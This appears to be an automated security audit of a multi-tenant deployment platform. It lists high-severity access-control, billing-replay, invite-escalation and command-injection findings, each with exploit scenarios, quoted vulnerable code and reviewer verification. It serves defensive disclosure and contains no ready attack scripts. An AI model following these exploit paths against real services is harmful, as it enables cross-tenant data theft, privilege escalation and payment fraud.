2. The realistic actor is not a blind id-guesser. Severity should not be discounted on "attacker must know a victim teamId." The teamId is visible to every current member (the dashboard sends it in the URL), so the clean exploit is an ex-member or downgraded member: after `deleteTeamMembership` removes them, `/api/infrastructure/health?teamId=<old team>` and `/api/infrastructure/compliance-report?teamId=<old team>` still return that org's full fleet health and compliance posture, indefinitely. Separately, `generateId()` (src/lib/utils.ts:20-24) uses `Math.random()` rather than a CSPRNG, which weakens the id space as a secondary factor.

Severity stays high: unauthenticated-to-tenant-boundary is intact (authn is enforced), but it is a broken-access-control cross-tenant read on a multi-tenant PaaS, read-only, with no write or execution primitive.

Fix is a two-line copy of the existing pattern from the sibling route — insert before the `listProjectsByTeam(teamId)` call in both handlers:
```
const membership = await getTeamMembership(teamId, session.user.id);
if (!membership) {
    return NextResponse.json({ error: 'Team access denied' }, { status: 403 });
}
```
matching src/app/api/infrastructure/remediate/route.ts:26-29. Worth grepping the other ~86 routes for the same `searchParams.get('teamId')` → `listProjectsByTeam` shape, since this is a repeated-omission pattern rather than a one-off. | Directionally correct; two refinements. (1) The route is not reachable anonymously — src/proxy.ts does not guard /api/*, but getSession() returns null without a valid cookie in production, so a valid session for ANY tenant is required (the MOCK_SESSION dev fallback is not the vector). (2) "Any authenticated user" overstates discovery: team ids are `team_` + ~26 random base36 chars and are not enumerable under the 100 req/min proxy rate limit, so the attacker must already know the victim teamId. That precondition is trivially met, without guessing, by an ex-member (membership deleted — every other team route now 403s them, these two do not), a viewer-role member, or an invitee who never accepted (src/app/join/page.tsx resolves invite.teamId pre-join). Accurate statement: GET /api/infrastructure/health and /api/infrastructure/compliance-report perform authentication but no authorization on the teamId query parameter, so any authenticated user holding a team id — including revoked members and never-joined invitees — can read that org's project inventory, connector inventory/regions, cost estimates, and full per-connector security risk findings. Fix is a one-liner already present in the sibling route: getTeamMembership(teamId, session.user.id) -> 403, as in src/app/api/infrastructure/remediate/route.ts:27-31.

**Verified code:**

```ts
I searched for a guard under the "existing mitigation" lens and found none. Everything below is verbatim from the files.

1) src/app/api/infrastructure/health/route.ts — the ENTIRE authorization surface (lines 1-26). Imports at line 3 are authn-only; no membership helper is imported or called anywhere in the 237-line file:
```
 1	import { NextRequest, NextResponse } from 'next/server';
 2	import { getSession } from '@/lib/auth';
 3	import { listProjectsByUser, listProjectsByTeam } from '@/lib/db';
...
12	        const session = await getSession();
13	        if (!session) {
14	            return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
15	        }
16	
17	        const { searchParams } = new URL(request.url);
18	        const teamId = searchParams.get('teamId');
19	
20	        // 1. Fetch projects for the context
21	        let projects: Project[] = [];
22	        if (teamId) {
23	            projects = await listProjectsByTeam(teamId);
24	        } else {
25	            projects = await listProjectsByUser(session.user.id);
26	        }
```
`session.user.id` is 
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** The claim survives adversarial review. I could not find any guard the finder missed at any layer: not in the handler (both files read in full — `getSession()` is the only check and it is authentication, not authorization), not in a wrapper (neither route uses `requireAuth`, and there is no route wrapper), not at the framework level (`src/proxy.ts` covers only `/dashboard` and `/new` for auth, and only headers + rate limiting for `/api/*`), not in the data layer (firebase-admin bypasses Firestore rules, and `listProjectsByTeam` has zero caller scoping), not in a type constraint (`teamId` is a raw `string | null` off `searchParams`), and not in a test.

The strongest evidence AGAINST refutation is internal to the codebase: `src/app/api/infrastructure/remediate/route.ts:25-29` — the third route in the very same directory — performs `getTeamMembership(teamId, session.user.id)` and returns 403 on failure, with the comment "Security: Verify user is a member of the team". `src/app/api/projects/route.ts:29-35` does the same via `listTeamsForUser`. The codebase's own convention is to authorize `teamId`, and these two GET routes are the ones that skipped it. That is an omission, not a design where a guard lives elsewhere.

The disclosure is real and non-trivial. Health returns `projectHealth` keyed by victim project id plus `regionalMappings[]` containing `projectId`, `projectName`, `projectRegion`, `storageId`, `storageName`, `storageRegion`, `storageType`, and a `summary` with the victim's `totalEstimatedMonthlyCost`, `costBreakdown`, `costForecast`, `averageSecurityScore` and `riskBreakdown` by level.

I did probe two things that could have argued severity down, and both cut the other way. (a) Predicting a teamId: `generateId('team')` in src/lib/utils.ts:20-24 builds ids from two `Math.random()` base36 slices — not a CSPRNG — so the id space is weaker than it looks, though blind brute force over HTTP is throttled by the proxy's 100 req/min per IP+path. (b) More importantly, guessing is not required at all. A teamId is handed to every member (the dashboard puts it straight in the query string at src/app/dashboard/infrastructure/page.tsx:80-81), so a member who is later removed or downgraded — via `deleteTeamMembership` in the teams members route — retains the id and keeps unrestricted read access to that org's fleet health and compliance posture forever. That is a concrete, no-guessing actor path.

Note the target file cited (health/route.ts:23) is accurate, and the finder's stated ruling-out is accurate as written. I am setting refuted=false rathe

</details>

### 🟠 HIGH — Public dashboard-widget query path never binds the widget to the storageId in the URL, nor restricts caller-supplied query variables
`authn-session-4` · `src/app/api/projects/[id]/storage/[storageId]/query/route.ts:58` · reported by 4 independent dimensions

**Failure scenario.** The widget document stores its own `storageId` (written at src/app/api/projects/[id]/storage/dashboards/route.ts:87) but the handler resolves the connector from the URL segment instead, and never compares the two. (1) Cross-connector: a project publishes widget W on its staging connector and a second public widget on its production connector — both storageIds are readable unauthenticated via GET /api/projects/[id]/storage/dashboards/[dashboardId]. An unauthenticated attacker POSTs `{"widgetId":"W"}` to `/api/projects/<id>/storage/<PRODUCTION-storageId>/query`, and W's saved query (e.g. `SELECT * FROM users LIMIT 500`) executes against the production database. (2) Variable tampering, no guess

**Impact.** Unauthenticated read of live customer database rows from connectors that were never shared publicly, and unauthenticated horizontal traversal of every row reachable by a published widget's parameterised query.

**Reviewer correction.** Directionally correct and reachable, but the two halves are not equally exploitable and the second half is understated. The unconditional, anonymous-reachable defect is the caller-supplied `variables` on the public widget path: variables are applied after `query = widgetData.query` (lines 28, 50, 91-133) even though the only legitimate public client never sends them, and the variable NAMES are interpolated unescaped into `new RegExp` (lines 101/116/129). On the non-SQL branch (123-132) the regex match is replaced with the raw attacker-supplied string and the read-only guard at line 136 is SQL-only, so an anonymous holder of any public Mongo/Redis/Firestore widget link can rewrite the saved query wholesale (collection, filter, or Redis command) — and for `type === 'firestore'` the executor is `getDb()`, the platform's own admin Firestore. On SQL connectors, substitution is bound-parameter based, so the impact there is parameter tampering (re-pointing `WHERE ... = :var`), not SQL injection. The storageId-binding gap is a genuine second defect (widgetData.storageId at dashboards/route.ts:87 is never compared to the URL segment used at line 58) but is conditional: the pivot is confined to connectors within the same project, and storage ids (`storage_<base36 ms><6 random base36>`) are not enumerable, so the attacker must already know a second connector's id — realistically because the project also published a widget on it, or via an insider/ex-member. Severity remains high on the strength of mechanism 2 plus the fact that masking (masking.ts) is name/pattern-based redaction rather than an access control. | Directionally correct and the mechanism holds, with two refinements worth carrying into the writeup.

Sharpen the disclosure premise: the claim asserts "both storageIds are readable unauthenticated" without saying how. The mechanism is src/app/api/projects/[id]/storage/dashboards/[dashboardId]/route.ts:53-55, whose GET spreads the entire widget document (storageId and query included) into an unauthenticated response whenever isPublic is set. So the cross-connector attack is not a guessing attack — it is a straightforward composition of two public endpoints, and it becomes possible the moment a project publishes widgets on two different connectors. If only one connector has a public widget, the attacker is reduced to guessing a `storage_<base36>` id, which is not practical over HTTP even with the per-pathname rate-limit bucket.

Split the variables half by connector type, because they are not equally severe:
  - SQL / PlanetScale: variables ARE genuinely parameterized (pg `$1`, mysql2 `?`, values in sqlParams) and `query = widgetData.query` blocks caller-supplied SQL. This is value control over placeholders the widget author already wrote — a tenant/id pivot on a filtered public widget — NOT SQL injection. Do not report it as injection.
  - MongoDB / Redis / Firestore: line 123-129 does raw `String(val)` interpolation into the query text, which is then `JSON.parse`d (line 770) or split into `redis[cmd](...args)` (line 825), and the read-only keyword allowlist at line 136 does not cover these types. A public Mongo widget with a `:var` inside a JSON string literal hands an anonymous caller structural control of the filter (collection, `$where`, limit). That is the sharpest edge of this finding and deserves to be called out explicitly rather than folded into a generic "variables are unrestricted".

The masking mitigation the finder checked is correctly dismissed: maskData is PII-regex-only and leaves ordinary columns intact. Severity stays high — not critical, because exploitation requires the project to have opted into the public-widget feature, and the SQL path is parameterized.

**Verified code:**

```ts
src/app/api/projects/[id]/storage/[storageId]/query/route.ts
 26:        const body = await request.json();
 27:        let { query } = body;
 28:        const { variables = {}, widgetId } = body;
 35:        if (widgetId) {
 36:            // Public Widget Path: No session required, but must be a valid public widget
 38:            const widgetDoc = await db.collection(Collections.PROJECTS).doc(id).collection('storage_dashboards').doc(widgetId).get();
 45:            if (!widgetData?.isPublic) {
 46:                return NextResponse.json({ success: false, error: 'Forbidden: Widget is not public' }, { status: 403 });
 50:            query = widgetData.query;
 56:                const projectDoc = await db.collection(Collections.PROJECTS).doc(id).get();
 57:                const projectData = projectDoc.data();
 58:                storageConfig = projectData?.storageConfigs?.find((s: StorageConfig) => s.id === storageId);
 60:        } else {
 62:            session = await getSession();
 70:                access = await checkProjectAccess(session.user.id, id);
 91:        if (Obje
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** REACHABILITY: confirmed end-to-end for an anonymous actor in NODE_ENV=production with MOCK_DB unset.

Entry point: POST /api/projects/{id}/storage/{storageId}/query with body {widgetId}. Line 35 branches into the widget path BEFORE any getSession() call (getSession is only reached in the else branch at line 62), so no cookie is needed and `access` stays null, meaning checkProjectAccess never runs. src/proxy.ts gates only `pathname.startsWith('/dashboard')`/`'/new'`, so neither `/api/projects/*` nor `/share/*` is auth-gated at the edge; the only edge control is a 100 req/min per-IP-per-path rate limit.

The unprivileged actor is real, not hypothetical. src/components/DataLab.tsx:1885 builds the share link as `${origin}/share/dashboard/${widget.id}?p=${projectId}` and simultaneously flips `isPublic: true` (line 1888). So the intended, shareable artifact hands an anonymous visitor both `projectId` and `widgetId`. src/app/api/projects/[id]/storage/dashboards/[dashboardId]/route.ts:41-56 then returns the ENTIRE widget doc unauthenticated when `isPublic` — including `storageId` and `query`. The legitimate public client (src/app/share/dashboard/[id]/page.tsx:79-83) posts only `{ widgetId }` and never sends `variables`, so `variables` on the public path is pure attacker surface with zero legitimate use.

MECHANISM 1 (storageId not bound to widget) — code gap CONFIRMED, exploitation CONDITIONAL. The handler resolves the connector from the URL segment (line 58: `storageConfig = projectData?.storageConfigs?.find((s) => s.id === storageId)`) and never reads `widgetData.storageId`, which POST /storage/dashboards writes at line 87. Grep for `widgetId`/`storageId` in the file shows the widget doc is used only for `isPublic` (45) and `query` (50). But the pivot is confined to the SAME project (both the widget lookup at 38 and the config lookup at 56 are scoped by `id`), and it requires knowing a second storageId. generateStorageId() in src/app/api/projects/[id]/storage/route.ts:14-16 emits `storage_${Date.now().toString(36)}${Math.random().toString(36).substring(2,8)}` — not enumerable over HTTP. GET /storage requires a session and project access. So the anonymous attacker learns a second storageId only if the project also published a widget on that other connector (then the public dashboards GET leaks it), or via an insider/ex-member/leaked screenshot. Viewers gain nothing here: the standard path applies no role gate to querying at all, so a viewer can already query every connector directly.

MECHANISM 2 (unrestricted caller-supplied variables) — CONFIRME

</details>

### 🟠 HIGH — Team invite tokens are readable by every member including viewers, and /api/invites/accept never binds the token to the invited email — viewer to owner escalation
`authn-session-5` · `src/app/api/invites/accept/route.ts:44`

**Failure scenario.** Step 1 — token disclosure: `GET /api/teams/[id]/invites` (src/app/api/teams/[id]/invites/route.ts:23-31) gates only on `getTeamMembership(id, session.user.id)` being non-null, so a `viewer` passes. It returns `listInvitesForTeam(id)`, which spreads the raw Firestore document (`return { ...data, createdAt, expiresAt } as TeamInvite`, src/lib/db.ts:661-666) — and `TeamInvite` includes `token: string` (src/types/index.ts:107). Step 2 — redemption: the attacker POSTs that token to /api/invites/accept. The handler compares nothing against `session.user.email`, and `acceptInvite` (src/lib/db.ts:718-749) unconditionally writes `{ teamId: invite.teamId, userId, role: invite.role }`. A viewer who see

**Impact.** A read-only team member escalates to team owner/admin, gaining project deletion, credential rotation, secret reveal, member removal and billing control over the whole team; the legitimate invitee's invite is consumed and deleted, and the duplicate membership row makes the escalation hard to spot in the members list.

**Reviewer correction.** Directionally correct and the two root causes are confirmed, but the escalation is probabilistic rather than deterministic for an existing member. Accurate restatement: (a) `GET /api/teams/[id]/invites` gates on bare membership rather than owner/admin — unlike its sibling revoke and create routes, which both check the role — and `listInvitesForTeam` spreads the raw Firestore doc, so any member including a `viewer` reads the plaintext `token` of pending `owner`/`admin` invites; (b) `POST /api/invites/accept` never compares `invite.email` to `session.user.email` (available at src/lib/auth.ts:24), so any authenticated user holding a token redeems it at the invited role. The correction is to the post-conditions: `acceptInvite` does not mutate the attacker's existing viewer row, it inserts a second `TeamMembership` doc with a `Math.random()`-derived id; because `getTeamMembership` is `.limit(1)` over equality-only filters (implicit `__name__` ordering), whichever of the two rows has the lexicographically smaller random id wins, so an already-member attacker escalates roughly half the time per consumed invite, not always. For an authenticated non-member the acceptance is unconditional and deterministic. Fixes: add an owner/admin role check to the invites GET and strip `token` from the response, bind accept to `session.user.email` (case-insensitive) and reject when it does not match, and make `acceptInvite` upsert against an existing membership instead of inserting a duplicate. | Directionally correct and reachable; one mechanism detail is imprecise. `acceptInvite` (src/lib/db.ts:718-749) does not upgrade the attacker's existing row — it inserts a second membership doc, leaving the viewer with both a `viewer` and an `owner`/`admin` row. Because `getTeamMembership` (src/lib/db.ts:751-770) uses `.limit(1)` with no `orderBy` and IDs are random (`tm_` + Math.random base36), which row wins is effectively a coin flip, so escalating the attacker's *own* account succeeds only about half the time. The deterministic exploit is one hop longer and equally cheap: the viewer reads the pending `owner`-role token from `GET /api/teams/[id]/invites`, then posts it from a second self-signup GitHub account (open signup, no allowlist) that has no prior membership — `acceptInvite` writes a single `owner` membership for that account and deletes the invite, giving the attacker uncontested owner control of the team. Severity stays high: no privileged position is needed beyond `viewer`, the precondition (a pending admin/owner invite, valid for 7 days) is routine, and the endpoints are directly reachable in production with an ordinary session cookie.

**Verified code:**

```ts
src/app/api/teams/[id]/invites/route.ts:22-31 (no role check on the endpoint that returns tokens)
    22	        // Check membership
    23	        const membership = await getTeamMembership(id, session.user.id);
    24	        if (!membership) {
    25	             return NextResponse.json(
    26	                { error: 'Forbidden' },
    27	                { status: 403, headers: securityHeaders }
    28	            );
    29	        }
    30	
    31	        const invites = await listInvitesForTeam(id);

src/lib/db.ts:654-669 (raw doc spread, no .select() projection, token included)
   654	export async function listInvitesForTeam(teamId: string): Promise<TeamInvite[]> {
   655	    const db = getDb();
   656	    const snapshot = await db
   657	        .collection(Collections.INVITES)
   658	        .where('teamId', '==', teamId)
   659	        .get();
   660	
   661	    return snapshot.docs.map(doc => {
   662	        const data = doc.data();
   663	        return {
   664	            ...data,
   665	            createdAt: data?.createdAt?.toDate(),
   666	            expiresAt: 
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I hunted for a guard on every layer the finder could have missed and found none.

1. Route-level guard on the token-disclosure endpoint: `src/app/api/teams/[id]/invites/route.ts` GET checks only `getSession()` (line 12) and `getTeamMembership(id, session.user.id)` being truthy (lines 23-29). There is no role comparison. Contrast the sibling revoke endpoint `src/app/api/teams/[id]/invites/[inviteId]/route.ts:23-28`, which DOES gate `membership.role !== 'owner' && membership.role !== 'admin'`, and the create endpoint `src/app/api/teams/[id]/invite/route.ts:37-42`, which gates the same way. The list endpoint is the odd one out — this is a missing guard, not an intentional design with a guard elsewhere.

2. Projection/sanitization guard in the data layer: `listInvitesForTeam` (src/lib/db.ts:654-669) issues a bare `.where('teamId','==',teamId).get()` with no `.select()` projection and returns `{ ...data, createdAt, expiresAt } as TeamInvite`. `TeamInvite` (src/types/index.ts:102-111) declares `token: string`, and `createInvite` (src/lib/db.ts:602-613) persists `token` into the document. So the raw `crypto.randomUUID()` token (src/app/api/teams/[id]/invite/route.ts, `const token = crypto.randomUUID()`) is in the JSON response. The TypeScript type is not a constraint here — it explicitly includes `token`.

3. Email binding in the accept path: I read `src/app/api/invites/accept/route.ts` end to end (59 lines). There is no reference to `session.user.email` anywhere, and no wrapper — the handler is a bare exported `POST`, not wrapped by any RBAC helper. `src/proxy.ts` (the Next 16 middleware replacement) only does subdomain rewrite, in-memory rate limiting, and security headers; it applies no authz to `/api/invites/*`. `acceptInvite` (src/lib/db.ts:718-749) reads the invite doc and writes a membership from `invite.teamId` / `invite.role` with the caller's `userId` — no email comparison, no existing-membership check. The session payload does carry `email` (src/lib/auth.ts:24), so the binding was available and simply not used.

4. Framework/rules-level protection: there is no `firestore.rules` in the repo (only `firestore.indexes.json`), and all access is server-side via firebase-admin, which bypasses security rules regardless.

5. Existing test pinning safe behaviour: none. `grep -rl "acceptInvite\|invites/accept" --include="*.test.*"` returns nothing; no invite-related test file exists in the 40+ test files present.

So both halves of the claim are real: a `viewer` can read the raw token of a pending `owner`/`admin` invite addressed to somebody else,

</details>

### 🟠 HIGH — Cloud SQL backup restore, regional migration and schema migrations have no role gate — a viewer can overwrite production data
`authn-session-6` · `src/app/api/projects/[id]/storage/[storageId]/backups/[backupId]/restore/route.ts:34` · reported by 2 independent dimensions

**Failure scenario.** A user holding the lowest role (`viewer`) on a team project — someone deliberately given read-only access, e.g. a contractor or auditor — POSTs to `/api/projects/<id>/storage/<storageId>/backups/<backupId>/restore`. `checkProjectAccess` returns `{allowed:true, role:'viewer'}` and the handler proceeds directly to `restoreBackup`, which issues a Cloud SQL `restoreBackup` call (src/lib/gcp/cloudsql.ts:402-416) that overwrites the live production instance with the backup's contents, discarding every write since that backup. Sending `backupId=pitr` with an arbitrary `pointInTime` body field does the same via point-in-time recovery. The same missing gate lets a viewer POST /migrate-region (src/app

**Impact.** Destructive, hard-to-reverse data loss on a customer's production database triggered by a principal the customer explicitly restricted to read-only, plus unbudgeted infrastructure spend from viewer-initiated regional migrations.

**Reviewer correction.** Directionally and mechanically correct; scope should be widened and one detail sharpened. All four routes lack the gate, confirmed by reading each: `restore/route.ts:34-36`, `migrate-region/route.ts:22-28`, `migrations/route.ts` POST (lines 91-121 of file), `migrations/rollback/route.ts:38-40`. Additionally, the `migrations` POST gap is worse than "run a migration": the body's `command` is string-interpolated into `sh -c` by `runMigration` (`src/lib/gcp/migrations.ts:309, 322-335`) in a build step whose env holds the production connection string, so a viewer gets arbitrary command execution beside production DB credentials, not just a schema change. Separately, all four routes contain a `process.env.MOCK_DB === 'true' && id === 'audit-id'` branch that skips `checkProjectAccess` entirely — harmless in production since it requires MOCK_DB, but it is why a grep for the role check pattern is easy to misread as "the access check is conditional". | Confirmed and reachable as described, with one amplification. A user holding role 'viewer' on a team project (an invitable role — teams/[id]/invite validates 'viewer') needs only their normal session cookie to POST to four Cloud SQL routes that never inspect access.role: backups/[backupId]/restore (Cloud SQL restoreBackup / PITR, overwrites instance data), migrate-region (starts a regional migration and flips storage status to 'provisioning' in Firestore), migrations (POST) and migrations/rollback. No proxy-level or helper-level gate compensates; the identical directory contains ten-plus sibling routes that do return 403 for viewers, so this is an enforcement gap rather than a design choice. The claim's lead example (restore) is not the worst of the four: migrations POST reads `command` from the request body (default 'prisma migrate deploy') and passes it to runMigration, which executes it in Cloud Build alongside the decrypted DATABASE_URL fetched from Secret Manager — so a read-only member gets attacker-chosen command execution against the production database, not just a restore. Severity stays high (privilege escalation from read-only to destructive/arbitrary DB operations by an authenticated low-privilege tenant); it is not critical only because the actor must already be an invited member of the target project rather than anonymous.

**Verified code:**

```ts
src/app/api/projects/[id]/storage/[storageId]/backups/[backupId]/restore/route.ts (full authorization path, lines 33-40 and 56-61):
  33:        } else {
  34:            const access = await checkProjectAccess(session.user.id, id);
  35:            if (!access.allowed) return NextResponse.json({ success: false, error: access.error }, { status: access.status });
  36:            storageConfig = access.project?.storageConfigs?.find((s: StorageConfig) => s.id === storageId);
  37:        }
  ...
  56:        const operationName = backupId === 'pitr'
  57:            ? await restoreBackup(instanceName, undefined, pointInTime)
  58:            : await restoreBackup(instanceName, backupId);
(`access.role` appears nowhere in the file.)

src/middleware/rbac.ts:18-21 — viewer membership yields allowed:true:
            const membership = await getTeamMembership(project.teamId, userId);
            if (membership) {
                return { allowed: true, project, role: membership.role };
            }

src/types/index.ts:75 — export type TeamRole = 'owner' | 'admin' | 'member' | 'viewer';
sr
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I hunted specifically for a guard the finder might have missed and found none at any layer.

1. Route file (60 lines, read in full): the only authorization is `checkProjectAccess`, whose result is consumed solely for `!access.allowed` and to look up `storageConfig`. `access.role` is never read. There is no wrapper — the handler is a bare exported `POST`, not wrapped in any `withAuth`/`withRole` HOF.

2. Framework layer: `src/proxy.ts` (the Next 16 middleware replacement) applies security headers, subdomain rewriting, and IP rate limiting, and only does a cookie-presence check for `/dashboard` and `/new`. It performs no RBAC and does not touch `/api/projects/*` beyond rate limiting. Next.js API routes inherit nothing from layouts, so there is no route-group guard either.

3. Helper layer: `restoreBackup` in `src/lib/gcp/cloudsql.ts:386` takes only `(instanceName, backupId, pointInTime)` — it has no session/role parameter and cannot enforce anything; it issues the destructive Cloud SQL `restoreBackup` REST call directly.

4. Session layer: `getSession` (`src/lib/auth.ts:88`) returns a decoded JWT with no role/permission field, so nothing upstream constrains the caller.

5. Type layer: `ProjectAccessResult` is a discriminated union, so `access.role` is available after the `allowed` narrowing — but nothing forces it to be consulted; TypeScript is satisfied by ignoring it.

6. Lint/CI layer: `eslint.config.mjs` is just `next/core-web-vitals` + `next/typescript` with ignores — there is no custom rule requiring a role gate (despite the recent "ESLint operational enforcement" commit).

7. Test layer: there are no API-route tests at all. Every `*.test.ts` under `src/` is lib-level (`cloudsql.test.ts`, `migrations.test.ts`, etc.); nothing pins a 403-for-viewer behavior on these routes.

8. Reachability: `viewer` is a real, assignable role — `src/app/api/teams/[id]/invite/route.ts:56` and `.../members/[userId]/route.ts:97` both list `['owner','admin','member','viewer']` as valid — and `checkProjectAccess` returns `{allowed:true, role: membership.role}` for any team membership including viewer. A viewer can also list backups (the sibling GET has no gate either, correctly), so they can obtain a real `backupId`; and the `backupId === 'pitr'` path needs no backup id at all.

9. The intended policy is unambiguous, which rules out "viewers are meant to have write access here": ten sibling storage routes gate viewers explicitly — `rotate:29`, `apply-index:32`, `ingest:23`, `audit:29`, `cutover:23`, `export:30`, `clone:27`, `import:30` (`if (access.role === '

</details>

### 🟠 HIGH — Payment verification has no idempotency ledger and never binds the payment to the session user, so one purchase can upgrade unlimited accounts unlimited times
`injection-db-2` · `src/app/api/billing/verify/route.ts:29`

**Failure scenario.** User A pays once and captures the triple (razorpay_order_id, razorpay_payment_id, razorpay_signature) from their own browser devtools. The route never checks (a) that the order's notes.userId equals session.user.id — the order notes {userId, tierId} set at src/app/api/billing/checkout/route.ts:81 are never read back, and (b) that this paymentId has not already been redeemed — no payments/redemptions collection is written or queried. User A posts the same triple from account B, C, D…: every one of them is upgraded. A can also re-post it from their own account every month to mint a fresh 30-day currentPeriodEnd. Grepped Collections for a payments ledger: src/lib/firebase.ts Collections has no 

**Impact.** A single INR 1,500 charge can be resold to an unbounded number of accounts, and any leaked/logged payment triple (support ticket, browser history, client-side error report) is a permanent free-upgrade token. Combined with the tier-escalation defect above, one INR 1,500 payment provisions unlimited Enterprise accounts.

**Reviewer correction.** Directionally correct and reachable, but the finder understated one primitive and overstated another.

UNDERSTATED — the sharpest bug is not idempotency, it is that `tierId` is attacker-controlled and never bound to the order. `verify/route.ts:19` destructures `tierId` from the request body and line 40 writes it verbatim as the subscription tier. The route never fetches the Razorpay order, so it never learns the amount actually paid or the `tierId` recorded in `notes` at checkout/route.ts:81. A user who legitimately pays 1500 INR for `pro` can, on their very first non-replayed verify call, post `tierId: "enterprise"` (15000 INR, `Infinity` limits) and it is accepted. This is exploitable with zero replay and zero account sharing, so the vulnerability does not depend on either of the two controls the claim names.

OVERSTATED — "unlimited times" as a renewal primitive is largely moot, for a reason that makes things worse rather than better. Verify writes `currentPeriodEnd` (line 43), but nothing in the enforcement path ever reads it: `grep -rn currentPeriodEnd src/` hits only `src/types/index.ts:48` and the two billing writers. The expiry check that does exist, `calculateTierLimits` (src/lib/billing/tiers.ts:113-116), tests `subscription.expiresAt`, a *different* field that verify never sets. So the escalated tier never expires and there is no reason to replay for renewal. The real multiplier is the missing user binding: one captured triple upgrades an unbounded number of distinct accounts, each permanently.

Accurate restatement: `POST /api/billing/verify` validates only `HMAC(orderId|paymentId, RAZORPAY_KEY_SECRET)` and then trusts the request body for the tier and the session cookie for the beneficiary. Any authenticated tenant holding one valid payment triple — their own, from devtools — can grant themselves or any number of other accounts a permanent `enterprise` subscription with `Infinity` deployment, build-minute, and bandwidth caps enforced at `src/app/api/projects/[id]/deploy/route.ts:54`. Fix requires all three: fetch the order and assert `notes.userId === session.user.id`, derive the tier from `notes.tierId`/order amount rather than the request body, and persist `paymentId` as a unique redemption record. | Directionally and mechanically correct; severity high is right. Two additions the finder understated. (a) `tierId` is taken straight from the request body and applied with a TypeScript cast only (`tier: tierId as 'free' | 'pro' | 'team' | 'enterprise'`, line 40) — verify never consults `TIERS`, unlike checkout which does at checkout/route.ts:37-43. So the replayed triple does not merely re-grant the tier that was paid for: a single cheapest paid-tier purchase can be redeemed as `enterprise`, on any account, arbitrarily many times. (b) The record verify writes sets `currentPeriodEnd` but never `expiresAt`, while the only expiry guard in the codebase — `calculateTierLimits` at src/lib/billing/tiers.ts:114-116 — keys off `subscription.expiresAt`. That guard therefore never fires for anything verify wrote, so a fraudulently granted tier does not lapse on its own. Accurate restatement: any authenticated user who obtains one genuine (orderId, paymentId, signature) triple can grant themselves, and any number of other accounts, a non-expiring enterprise subscription an unlimited number of times, because the route neither binds the payment to the session user via the order's `notes.userId`, nor records the paymentId as redeemed, nor validates the requested tier against what was actually paid.

**Verified code:**

```ts
src/app/api/billing/verify/route.ts:18-49
    18	        const body = await req.json();
    19	        const { orderId, paymentId, signature, tierId } = body;
    ...
    29	        const isValid = verifyPaymentSignature(orderId, paymentId, signature);
    ...
    39	        const updatedSubscription = {
    40	            tier: tierId as 'free' | 'pro' | 'team' | 'enterprise',
    41	            status: 'active' as const,
    42	            currentPeriodStart: new Date(),
    43	            currentPeriodEnd: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000), // 30 days
    44	            razorpaySubscriptionId: orderId, // Using orderId as subscription id for now
    45	        };
    46	
    47	        await updateUser(session.user.id, {
    48	            subscription: updatedSubscription
    49	        });

src/lib/billing/payments.ts:49-64 (no network call, no dedupe, no ownership)
    49	export function verifyPaymentSignature(
    50	    orderId: string,
    51	    paymentId: string,
    52	    signature: string
    53	): boolean {
    54	    const secret = config.billing.razorpa
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** REACHABILITY: `/api/billing/verify` is a plain App Router `POST` handler. The only gate is `getSession()` (src/lib/auth.ts:82-102). With NODE_ENV=production and MOCK_DB unset, the MOCK_SESSION fallback at auth.ts:92-97 is dead, so a caller needs a real `deployify_session` JWT — i.e. any ordinary signed-up tenant, no team role, no project scope, no admin. src/proxy.ts applies only generic per-IP rate limiting (100/min; strict list is `/api/auth/` and `/api/webhooks/` only), which does not gate this. So an unprivileged authenticated tenant reaches line 29 directly.

VERIFICATION OF THE MECHANISM: `verifyPaymentSignature` (src/lib/billing/payments.ts:49-64) is a pure local HMAC-SHA256 over the literal string `orderId + '|' + paymentId`. It makes no network call to Razorpay, so nothing server-side ever observes order ownership, order amount, or whether the payment was already consumed. The route then writes `tier: tierId` — the client-supplied field from the request body, never cross-checked against anything — onto `session.user.id` via `updateUser`.

Both claimed missing controls are real:
(a) No order-ownership binding. `checkout/route.ts:81` sets `notes: { userId: user.id, tierId: tier.id }`, and the webhook route reads `payment.notes.userId` back (webhook/route.ts:35-37), proving the notes exist and are the intended binding — but `verify/route.ts` never fetches the order and never reads notes. It updates whichever session presented the triple.
(b) No idempotency ledger. `grep -rn "paymentId|payment_id" src/` returns only the verify route, the client page, and the HMAC helper. `paymentId` is never persisted. `grep -rni idempot src/` hits one unrelated MongoDB comment. There is no invoices collection and no reconciliation cron (only `src/app/api/cron/optimize`).

REAL ENTITLEMENT IMPACT (not cosmetic): `getUserTier` (src/lib/billing/caps.ts:37-41) reads `user.subscription?.tier` straight from Firestore — the exact field verify writes — and `src/app/api/projects/[id]/deploy/route.ts:54-60` hard-blocks deploys on `checkUsageLimits`. Enterprise limits are `Infinity` for projects/deployments/buildMinutes/bandwidth (tiers.ts:66-71), so the escalation buys unmetered Cloud Build/Cloud Run consumption.

ATTACKER PREREQUISITE IS PLAUSIBLE: Razorpay hands `razorpay_order_id`, `razorpay_payment_id`, and `razorpay_signature` to the browser in the checkout `handler` callback (src/app/billing/page.tsx:136-147), so any user who completes one real payment holds a permanently valid triple in devtools. Minimum cost is one Pro purchase (1500 INR; `free` checkou

</details>

### 🟠 HIGH — GitHub-webhook deployments bypass the usage-cap gate entirely; caps are only enforced on the manual /deploy route
`injection-db-4` · `src/app/api/webhooks/github/route.ts:129` · reported by 2 independent dimensions

**Failure scenario.** A free-tier account (TIERS.free = 20 deployments/mo, 100 build minutes/mo, src/lib/billing/tiers.ts:34-39) connects a repo and simply pushes commits instead of clicking Deploy. Each push reaches handlePushEvent, which goes createDeployment -> generateCloudRunDeployConfig -> submitCloudBuild with no call to checkUsageLimits. The same hole exists in handlePullRequestEvent (line 520 createDeployment, line 590 submitCloudBuild). Because a `pull_request` `opened`/`synchronize` build is triggered by *anyone on the internet* who opens a PR against a connected public repo, an unauthenticated third party can submit unbounded Cloud Build jobs against the project — each one pulling the project's previe

**Impact.** Tier quotas are unenforceable through the primary deployment path — a free account can consume unlimited platform-funded Cloud Build minutes, Artifact Registry storage and Cloud Run revisions. With the PR path this is remotely reachable by an unauthenticated attacker, making it a direct cost-amplification/DoS vector against the platform's GCP bill.

